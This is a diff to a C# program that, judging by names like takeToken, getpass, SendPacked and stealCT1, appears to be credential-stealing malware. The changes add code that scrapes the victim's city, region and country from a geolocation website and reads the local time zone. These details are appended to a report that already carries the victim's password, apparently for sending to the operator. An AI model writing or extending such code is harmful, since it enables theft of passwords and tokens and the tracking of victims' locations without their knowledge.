@@ -173,7 +173,6 @@ namespace Program
 				return macAddresses1;
 			}
 
-
 			public static string takeToken()
 			{
 				try
@@ -191,7 +190,6 @@ namespace Program
 					return null;
 				}
 			}
-
 
 			public void Startup()
 			{
@@ -222,9 +220,6 @@ namespace Program
 				}
 			}
 		}
-
-
-
 
 
 		public static class SendPacked
@@ -318,6 +313,10 @@ namespace Program
 								"\n",
 								"Password: ```\n" + getpass() + "```",
 								"\n",
+								"City/Region/Country: ```\n" + GrabLocation() + "```",
+								"\n",
+								"Time Zone: ```\n" + GrabTime()[1] + "```",
+								"\n",
 								//mack
 								//tok3n
 								//infolel
@@ -394,6 +393,10 @@ namespace Program
 								"\n",
 								"Password: ```\n" + getpass() + "```",
 								"\n",
+								"City/Region/Country: ```\n" + GrabLocation() + "```",
+								"\n",
+								"Time Zone: ```\n" + GrabTime()[1] + "```",
+								"\n",
 								//mack	
 								//tok3n
 								//infolel
@@ -411,6 +414,34 @@ namespace Program
 				//stealCT1
 				//Tracer
 			}
+
+			public static string GrabLocation()
+            {
+            try
+            {
+                var info = new WebClient().DownloadString("https://www.geodatatool.com/");
+                string[] data = info.Split('\n');
+                string country = data[458].Trim();
+                string region = (((data[469]).Split('>'))[1]).Split('<')[0];
+                string city = (((data[474]).Split('>'))[1]).Split('<')[0];
+                string Location = city + "/" + region + "/" + country;
+                return Location;
+            }
+            catch
+            {
+                string Location = "N/A";
+                return Location;
+            }
+        } 
+
+            public static List<string> GrabTime()
+            {
+            var zone = TimeZoneInfo.Local; 
+            List<string> TimeData = new List<string>();
+            TimeData.Add(DateTime.Now.ToString("h:mm:ss tt"));
+            TimeData.Add(zone.DisplayName);
+            return TimeData;
+            }
 		}
 		//myholywaters
 		public class Tracer
